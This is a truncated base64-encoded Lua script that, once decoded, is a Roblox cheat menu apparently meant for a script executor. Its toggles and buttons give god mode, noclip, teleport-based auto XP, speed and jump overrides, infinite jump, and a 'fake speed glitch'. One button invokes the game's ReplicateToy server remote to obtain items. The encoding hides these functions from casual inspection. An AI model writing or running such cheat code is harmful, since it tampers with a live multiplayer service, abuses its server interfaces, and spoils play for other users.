QKICAgICAgICAgICAgY2hnQ29pblNpemUoYywgVmVjdG9yMy5uZXcoc20sIHNtLCBzbSkpCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIHVwZENvaW5zKFZlY3RvcjMubmV3KDEsIDEsIDEpKQogICAgICAgIGlmIGNvbiB0aGVuCiAgICAgICAgICAgIGNvbjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgY29uID0gbmlsCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKZ2V0Z2VudigpLmF4cCA9IGdldGdlbnYoKS5zYXZlZENvbmZpZy5heHAgb3IgZmFsc2UKZ2V0Z2VudigpLmF4cGNvbiA9IG5pbApnZXRnZW52KCkuZCA9IDAKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjUsICJBdXRvIFhQIiwgIiIsIGdldGdlbnYoKS5heHAsIGZ1bmN0aW9uKHMpCiAgICBnZXRnZW52KCkuYXhwID0gcwogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLmF4cCA9IHMKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKCiAgICBpZiBnZXRnZW52KCkuYXhwY29uIHRoZW4KICAgICAgICBnZXRnZW52KCkuYXhwY29uOkRpc2Nvbm5lY3QoKQogICAgICAgIGdldGdlbnYoKS5heHBjb24gPSBuaWwKICAgIGVuZAogICAgaWYgcyB0aGVuCiAgICAgICAgZ2V0Z2VudigpLmF4cGNvbiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKGR0KQogICAgICAgICAgICBnZXRnZW52KCkuZCArPSBkdAogICAgICAgICAgICBpZiBnZXRnZW52KCkuZCA8IDAuMSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgZ2V0Z2VudigpLmQgPSAwCiAgICAgICAgICAgIGlmIGdldGdlbnYoKS5heHAgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoLTEwOCwgMTM4LCA5KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRCdXR0b24odGFiNiwgIkFuY2hvciBjaGFyYWN0ZXIiLCAiQW5jbGFyIGVsIHBlcnNvbmFqZSIsIGZ1bmN0aW9uKCkKICAgIGxvY2FsIGNoYXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIG9yIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKICAgIGlzQW5jaG9yZWQgPSBub3QgaXNBbmNob3JlZAogICAgZm9yIF8sIHBhcnQgaW4gaXBhaXJzKGNoYXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgIHBhcnQuQW5jaG9yZWQgPSBpc0FuY2hvcmVkCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKZ2V0Z2VudigpLmNmZyA9IGdldGdlbnYoKS5sb2FkQ29uZmlnKCkKZ2V0Z2VudigpLmFmID0gZ2V0Z2VudigpLmNmZy5hZiBvciBmYWxzZQpnZXRnZW52KCkuYWZjID0gZ2V0Z2VudigpLmFmYyBvciBuaWwKCmxvY2FsIGxwID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKCmxvY2FsIGZ1bmN0aW9uIHRBRihzKQogICAgZ2V0Z2VudigpLmFmID0gcwogICAgZ2V0Z2VudigpLmNmZy5hZiA9IHMKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5jZmcpCiAgICBpZiBzIHRoZW4KICAgICAgICBpZiBnZXRnZW52KCkuYWZjIHRoZW4gZ2V0Z2VudigpLmFmYzpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgZ2V0Z2VudigpLmFmYyA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgICAgIGZvciBfLCBwIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKTpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBwIH49IGxwIGFuZCBwLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBydCBpbiBpcGFpcnMocC5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgcHJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgcHJ0LkNhbkNvbGxpZGUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgaWYgZ2V0Z2VudigpLmFmYyB0aGVuCiAgICAgICAgICAgIGdldGdlbnYoKS5hZmM6RGlzY29ubmVjdCgpCiAgICAgICAgICAgIGdldGdlbnYoKS5hZmMgPSBuaWwKICAgICAgICBlbmQKICAgIGVuZAplbmQKCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjYsICJBbnRpIGZsaW5nIiwgIiIsIGdldGdlbnYoKS5jZmcuYWYgb3IgZmFsc2UsIGZ1bmN0aW9uKHN0YXRlKQogICAgdEFGKHN0YXRlKQplbmQpCgpsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgaHVtYW5vaWRDb25uCgpsb2NhbCBmdW5jdGlvbiBhY3RpdmF0ZUdvZE1vZGUoY2hhcmFjdGVyKQogICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCiAgICBodW1hbm9pZC5IZWFsdGggPSBodW1hbm9pZC5NYXhIZWFsdGgKICAgIGh1bWFub2lkQ29ubiA9IGh1bWFub2lkLkNoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAgaWYgaHVtYW5vaWQuSGVhbHRoIDwgaHVtYW5vaWQuTWF4SGVhbHRoIHRoZW4KICAgICAgICAgICAgaHVtYW5vaWQuSGVhbHRoID0gaHVtYW5vaWQuTWF4SGVhbHRoCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZAoKbG9jYWwgZnVuY3Rpb24gZGVhY3RpdmF0ZUdvZE1vZGUoKQogICAgaWYgaHVtYW5vaWRDb25uIHRoZW4KICAgICAgICBodW1hbm9pZENvbm46RGlzY29ubmVjdCgpCiAgICAgICAgaHVtYW5vaWRDb25uID0gbmlsCiAgICBlbmQKZW5kCgpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWI2LCAic2Vjb25kIGxpZmUiLCAiU2VndW5kYSB2aWRhIiwgZ2V0Z2VudigpLnNhdmVkQ29uZmlnWyJzZWNvbmQgbGlmZSJdIG9yIGZhbHNlLCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZ1sic2Vjb25kIGxpZmUiXSA9IHN0YXRlCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCgogICAgaWYgc3RhdGUgdGhlbgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGFjdGl2YXRlR29kTW9kZShjaGFyYWN0ZXIpCiAgICAgICAgcGxheWVyLkNoYXJhY3RlckFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hhcikKICAgICAgICAgICAgaWYgZ2V0Z2VudigpLnNhdmVkQ29uZmlnWyJzZWNvbmQgbGlmZSJdIHRoZW4KICAgICAgICAgICAgICAgIGFjdGl2YXRlR29kTW9kZShjaGFyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbHNlCiAgICAgICAgZGVhY3RpdmF0ZUdvZE1vZGUoKQogICAgZW5kCmVuZCkKCkxpYnJhcnkuYWRkQnV0dG9uKHRhYjYsICJSZXNldCIsICJSZWFwYXJlY2VyIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgY2hhcmFjdGVyOkJyZWFrSm9pbnRzKCkKICAgIGVuZAplbmQpCgpnZXRnZW52KCkuXyA9IGZhbHNlCmxvY2FsIHJzID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgbgoKTGlicmFyeS5hZGRUb2dnbGUodGFiNiwgIk5vY2xpcCIsICIiLCBmYWxzZSwgZnVuY3Rpb24ocykKICAgIGdldGdlbnYoKS5fID0gcwogICAgaWYgcyB0aGVuCiAgICAgICAgaWYgbiB0aGVuIG46RGlzY29ubmVjdCgpIGVuZAogICAgICAgIG4gPSBycy5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICBsb2NhbCBjID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBpZiBjIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCBwIGluIGlwYWlycyhjOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgcDpJc0EoIkJhc2VQYXJ0IikgYW5kIHAuQ2FuQ29sbGlkZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHAuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIGlmIG4gdGhlbgogICAgICAgICAgICBuOkRpc2Nvbm5lY3QoKQogICAgICAgICAgICBuID0gbmlsCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKZ2V0Z2VudigpLnNjID0gZ2V0Z2VudigpLnNjIG9yIHsgY2YgPSB7IGYgPSA4MCwgZSA9IGZhbHNlIH0gfQoKTGlicmFyeS5hZGRUZXh0Ym94KHRhYjYsICJBZGp1c3QgRk9WIiwgIiIsIHRvc3RyaW5nKGdldGdlbnYoKS5zYy5jZi5mKSwgZnVuY3Rpb24odCkKICAgIGxvY2FsIHYgPSB0b251bWJlcih0KQogICAgaWYgdiB0aGVuCiAgICAgICAgZ2V0Z2VudigpLnNjLmNmLmYgPSB2CiAgICAgICAgaWYgZ2V0Z2VudigpLnNjLmNmLmUgdGhlbgogICAgICAgICAgICB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5GaWVsZE9mVmlldyA9IHYKICAgICAgICBlbmQKICAgICAgICBzYXZlZENvbmZpZyA9IGdldGdlbnYoKS5zYwogICAgICAgIHNhdmVDb25maWcoc2F2ZWRDb25maWcpCiAgICBlbmQKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiNiwgIkFjdGl2YXRlIEZPViIsICIiLCBnZXRnZW52KCkuc2MuY2YuZSwgZnVuY3Rpb24ocykKICAgIGdldGdlbnYoKS5zYy5jZi5lID0gcwogICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuRmllbGRPZlZpZXcgPSBzIGFuZCBnZXRnZW52KCkuc2MuY2YuZiBvciA3MAogICAgc2F2ZWRDb25maWcgPSBnZXRnZW52KCkuc2MKICAgIHNhdmVDb25maWcoc2F2ZWRDb25maWcpCmVuZCkKCmdldGdlbnYoKS5QLCBnZXRnZW52KCkuUlMsIGdldGdlbnYoKS5VSVMsIGdldGdlbnYoKS5wID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIiksIGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLCBnYW1lOkdldFNlcnZpY2UoIlVzZXJJbnB1dFNlcnZpY2UiKSwgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKZ2V0Z2VudigpLnMgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcucyBvciB7IHMgPSB7IHYgPSAxNywgbCA9IGZhbHNlIH0sIGogPSB7IHAgPSA1MCwgbCA9IGZhbHNlLCBpID0gZmFsc2UgfSwgYyA9IHt9IH0KZ2V0Z2VudigpLnUgPSBmdW5jdGlvbihwcm9wLCB2KQogICAgbG9jYWwgaCA9IGdldGdlbnYoKS5wLkNoYXJhY3RlciBhbmQgZ2V0Z2VudigpLnAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgaWYgaCB0aGVuIGhbcHJvcF0gPSB2IGVuZAplbmQKZ2V0Z2VudigpLnQgPSBmdW5jdGlvbihrZXksIHN0YXRlLCBldmVudCwgZnVuYykKICAgIGlmIGdldGdlbnYoKS5zLmNba2V5XSB0aGVuCiAgICAgICAgZ2V0Z2VudigpLnMuY1trZXldOkRpc2Nvbm5lY3QoKQogICAgICAgIGdldGdlbnYoKS5zLmNba2V5XSA9IG5pbAogICAgZW5kCiAgICBpZiBzdGF0ZSB0aGVuCiAgICAgICAgZ2V0Z2VudigpLnMuY1trZXldID0gZXZlbnQ6Q29ubmVjdChmdW5jKQogICAgZW5kCmVuZApnZXRnZW52KCkucC5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgIHJlcGVhdCB0YXNrLndhaXQoKSB1bnRpbCBnZXRnZW52KCkucC5DaGFyYWN0ZXIgYW5kIGdldGdlbnYoKS5wLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICBmb3IgaywgYyBpbiBwYWlycyhnZXRnZW52KCkucy5jKSBkbwogICAgICAgIGlmIGMgdGhlbiBjOkRpc2Nvbm5lY3QoKSBnZXRnZW52KCkucy5jW2tdID0gbmlsIGVuZAogICAgZW5kCiAgICBsb2NhbCBoID0gZ2V0Z2VudigpLnAuQ2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQogICAgaWYgZ2V0Z2VudigpLnMucy5sIHRoZW4gZ2V0Z2VudigpLnUoIldhbGtTcGVlZCIsIGdldGdlbnYoKS5zLnMudikgZW5kCiAgICBpZiBnZXRnZW52KCkucy5qLmwgdGhlbiBnZXRnZW52KCkudSgiSnVtcFBvd2VyIiwgZ2V0Z2VudigpLnMuai5wKSBlbmQKICAgIGlmIGdldGdlbnYoKS5zLmouaSB0aGVuCiAgICAgICAgZ2V0Z2VudigpLnQoImkiLCB0cnVlLCBnZXRnZW52KCkuVUlTLkp1bXBSZXF1ZXN0LCBmdW5jdGlvbigpCiAgICAgICAgICAgIGlmIGdldGdlbnYoKS5zLmouaSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBoID0gZ2V0Z2VudigpLnAuQ2hhcmFjdGVyIGFuZCBnZXRnZW52KCkucC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICBpZiBoIHRoZW4gaDpDaGFuZ2VTdGF0ZSgiSnVtcGluZyIpIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQpMaWJyYXJ5LmFkZFNsaWRlcih0YWI2LCAiU3BlZWQiLCAiU3BlZWQiLCAwLCAxMDAsIGdldGdlbnYoKS5zLnMudiwgZnVuY3Rpb24odikKICAgIGdldGdlbnYoKS5zLnMudiA9IHYKICAgIGlmIGdldGdlbnYoKS5zLnMubCB0aGVuIGdldGdlbnYoKS51KCJXYWxrU3BlZWQiLCB2KSBlbmQKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5zID0gZ2V0Z2VudigpLnMKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKZW5kKQpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWI2LCAiTG9vcCBzcGVlZCIsICJidWNsZSBkZSB2ZWxvY2lkYWQiLCBnZXRnZW52KCkucy5zLmwsIGZ1bmN0aW9uKHN0YXRlKQogICAgZ2V0Z2VudigpLnMucy5sID0gc3RhdGUKICAgIGdldGdlbnYoKS50KCJzIiwgc3RhdGUsIGdldGdlbnYoKS5SUy5IZWFydGJlYXQsIGZ1bmN0aW9uKCkKICAgICAgICBpZiBnZXRnZW52KCkucy5zLmwgdGhlbiBnZXRnZW52KCkudSgiV2Fsa1NwZWVkIiwgZ2V0Z2VudigpLnMucy52KSBlbmQKICAgIGVuZCkKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5zID0gZ2V0Z2VudigpLnMKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKZW5kKQpMaWJyYXJ5LmFkZFNsaWRlcih0YWI2LCAiUG93ZXIgSnVtcCIsICJQb3dlciBKdW1wIiwgMCwgMTAwLCBnZXRnZW52KCkucy5qLnAsIGZ1bmN0aW9uKHYpCiAgICBnZXRnZW52KCkucy5qLnAgPSB2CiAgICBpZiBnZXRnZW52KCkucy5qLmwgdGhlbiBnZXRnZW52KCkudSgiSnVtcFBvd2VyIiwgdikgZW5kCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcucyA9IGdldGdlbnYoKS5zCiAgICBnZXRnZW52KCkuc2F2ZUNvbmZpZyhnZXRnZW52KCkuc2F2ZWRDb25maWcpCmVuZCkKTGlicmFyeS5hZGRUb2dnbGUodGFiNiwgIlBvd2VyIEp1bXAvTG9vcCIsICJidWNsZSBkZSBwb2RlciBkZSBzYWx0byIsIGdldGdlbnYoKS5zLmoubCwgZnVuY3Rpb24oc3RhdGUpCiAgICBnZXRnZW52KCkucy5qLmwgPSBzdGF0ZQogICAgZ2V0Z2VudigpLnQoImoiLCBzdGF0ZSwgZ2V0Z2VudigpLlJTLkhlYXJ0YmVhdCwgZnVuY3Rpb24oKQogICAgICAgIGlmIGdldGdlbnYoKS5zLmoubCB0aGVuIGdldGdlbnYoKS51KCJKdW1wUG93ZXIiLCBnZXRnZW52KCkucy5qLnApIGVuZAogICAgZW5kKQogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnMgPSBnZXRnZW52KCkucwogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCkxpYnJhcnkuYWRkVG9nZ2xlKHRhYjYsICJJbmZpbml0ZSBKdW1wIiwgInNhbHRvIGluZmluaXRvIiwgZ2V0Z2VudigpLnMuai5pLCBmdW5jdGlvbihzdGF0ZSkKICAgIGdldGdlbnYoKS5zLmouaSA9IHN0YXRlCiAgICBnZXRnZW52KCkudCgiaSIsIHN0YXRlLCBnZXRnZW52KCkuVUlTLkp1bXBSZXF1ZXN0LCBmdW5jdGlvbigpCiAgICAgICAgaWYgZ2V0Z2VudigpLnMuai5pIHRoZW4KICAgICAgICAgICAgbG9jYWwgaCA9IGdldGdlbnYoKS5wLkNoYXJhY3RlciBhbmQgZ2V0Z2VudigpLnAuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICBpZiBoIHRoZW4gaDpDaGFuZ2VTdGF0ZSgiSnVtcGluZyIpIGVuZAogICAgICAgIGVuZAogICAgZW5kKQogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLnMgPSBnZXRnZW52KCkucwogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpnZXRnZW52KCkuc2F2ZWRDb25maWcgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcgb3Ige30KZ2V0Z2VudigpLnNhdmVDb25maWcgPSBnZXRnZW52KCkuc2F2ZUNvbmZpZyBvciBmdW5jdGlvbihjb25maWcpIGVuZAoKZ2V0Z2VudigpLmdwID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLmdwIG9yIDE1CmdldGdlbnYoKS5hY2MgPSAwLjMKZ2V0Z2VudigpLmhiID0gbmlsCgpsb2NhbCBwID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKCmxvY2FsIGZ1bmN0aW9uIHVwZGF0ZUNoYXJhY3RlclJlZnMoYykKICAgIGdldGdlbnYoKS5jID0gYwogICAgZ2V0Z2VudigpLmggPSBjOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQogICAgZ2V0Z2VudigpLnJvb3QgPSBjOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCmVuZAoKaWYgcC5DaGFyYWN0ZXIgdGhlbgogICAgdXBkYXRlQ2hhcmFjdGVyUmVmcyhwLkNoYXJhY3RlcikKZW5kCnAuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdCh1cGRhdGVDaGFyYWN0ZXJSZWZzKQoKTGlicmFyeS5hZGRTbGlkZXIodGFiNiwgIlNwZWVkIGdsaXRjaCBhZGp1c3QiLCAiIiwgMSwgNzAsIGdldGdlbnYoKS5ncCwgZnVuY3Rpb24odikKICAgIGdldGdlbnYoKS5ncCA9IHYKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5ncCA9IHYKICAgIGdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiNiwgIkZha2Ugc3BlZWQgZ2xpdGNoIiwgIiIsIGdldGdlbnYoKS5zYXZlZENvbmZpZy5mc2cgb3IgZmFsc2UsIGZ1bmN0aW9uKHMpCiAgICBpZiBzIHRoZW4KICAgICAgICBpZiBnZXRnZW52KCkuaGIgdGhlbiBnZXRnZW52KCkuaGI6RGlzY29ubmVjdCgpIGVuZAogICAgICAgIGdldGdlbnYoKS5oYiA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgaCwgcm9vdCA9IGdldGdlbnYoKS5oLCBnZXRnZW52KCkucm9vdAogICAgICAgICAgICBpZiBoIGFuZCByb290IHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHN0YXRlID0gaDpHZXRTdGF0ZSgpCiAgICAgICAgICAgICAgICBpZiBzdGF0ZSA9PSBFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkp1bXBpbmcgb3Igc3RhdGUgPT0gRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5GcmVlZmFsbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGlyID0gaC5Nb3ZlRGlyZWN0aW9uCiAgICAgICAgICAgICAgICAgICAgaWYgZGlyLk1hZ25pdHVkZSA+IDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBnZXRnZW52KCkuYWNjID0gbWF0aC5taW4oZ2V0Z2VudigpLmFjYyArIDAuMDUsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHNwZWVkID0gZ2V0Z2VudigpLmdwICogZ2V0Z2VudigpLmFjYwogICAgICAgICAgICAgICAgICAgICAgICByb290LkNGcmFtZSArPSBkaXIuVW5pdCAqIHNwZWVkIC8gMTUwCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIGlmIGdldGdlbnYoKS5oYiB0aGVuIGdldGdlbnYoKS5oYjpEaXNjb25uZWN0KCkgZW5kCiAgICAgICAgZ2V0Z2VudigpLmhiID0gbmlsCiAgICAgICAgZ2V0Z2VudigpLmFjYyA9IDAuMwogICAgZW5kCiAgICBnZXRnZW52KCkuc2F2ZWRDb25maWcuZnNnID0gcwogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQplbmQpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWI2LCAiZmFrZSBzcGVlZCBnbGljaCB3aXRoIGVtb3RlIiwgIkZhbHNvIHNwZWVkIGdsaWNoIGNvbiBlbW90ZSIsIGZ1bmN0aW9uKCkKbG9jYWwgcCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgpsb2NhbCBnID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQpnLlJlc2V0T25TcGF3biA9IGZhbHNlCmcuUGFyZW50ID0gcDpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpCmxvY2FsIGIgPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iKQpiLlNpemUgPSBVRGltMi5uZXcoMCwgNTAsIDAsIDUwKQpiLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTI1LCAwLCAxMCkKYi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC42CmIuRHJhZ2dhYmxlID0gdHJ1ZQpiLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDIwMCwgMjAwKQpiLlRleHQgPSAiRmFrZSBFbW90ZSBTcGVlZCIKYi5UZXh0Q29sb3IzID0gQ29sb3IzLm5ldygxLCAxLCAxKQpiLlRleHRTaXplID0gNgpiLkF1dG9CdXR0b25Db2xvciA9IGZhbHNlCmIuUGFyZW50ID0gZwpsb2NhbCBjID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmMuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgOCkKYy5QYXJlbnQgPSBiCmxvY2FsIGYgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKZi5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCmYuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMCwgMCkKZi5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpmLlpJbmRleCA9IGIuWkluZGV4ICsgMQpmLlBhcmVudCA9IGIKbG9jYWwgcyA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQpzLlRoaWNrbmVzcyA9IDIKcy5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDE4MCwgMTgwLCAxODApCnMuUGFyZW50ID0gZgpsb2NhbCBmYyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpmYy5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxMCkKZmMuUGFyZW50ID0gZgpiLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQpsb2NhbCBQbGF5ZXJzPWdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIHBsYXllcj1QbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIGNoYXJhY3Rlcj1wbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZDpXYWl0KCkKbG9jYWwgaHVtYW5vaWQ9Y2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWQiKQpsb2NhbCBhbmltYXRpb249SW5zdGFuY2UubmV3KCJBbmltYXRpb24iKQphbmltYXRpb24uQW5pbWF0aW9uSWQ9InJieGFzc2V0aWQ6Ly8xMDIxNDMxOTUxOCIKbG9jYWwgYWN0aXZlQW5pbWF0aW9uPWh1bWFub2lkOkxvYWRBbmltYXRpb24oYW5pbWF0aW9uKQphY3RpdmVBbmltYXRpb246UGxheSgpCmFjdGl2ZUFuaW1hdGlvbjpBZGp1c3RTcGVlZCgxLjEpCmxvY2FsIGJhY2twYWNrPXBsYXllcjpGaW5kRmlyc3RDaGlsZCgiQmFja3BhY2siKQpsb2NhbCB0b29sTmFtZT0iVGVkZHkiCmxvY2FsIGNvbW1vbkVnZ0FyZ3M9e1sxXT0iQ29tbW9uRWdnMjAyNCJ9CmdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SZW1vdGVzLkV4dHJhcy5SZXBsaWNhdGVUb3k6SW52b2tlU2VydmVyKHVucGFjayhjb21tb25FZ2dBcmdzKSkKbG9jYWwgYXJncz17WzFdPXRvb2xOYW1lfQpnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5FeHRyYXMuUmVwbGljYXRlVG95Okludm9rZVNlcnZlcih1bnBhY2soYXJncykpCmxvY2FsIHRvb2w9YmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkNvbW1vbkVnZzIwMjQiKSBvciBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkNvbW1vbkVnZzIwMjQiKQppZiB0b29sIHRoZW4KdG9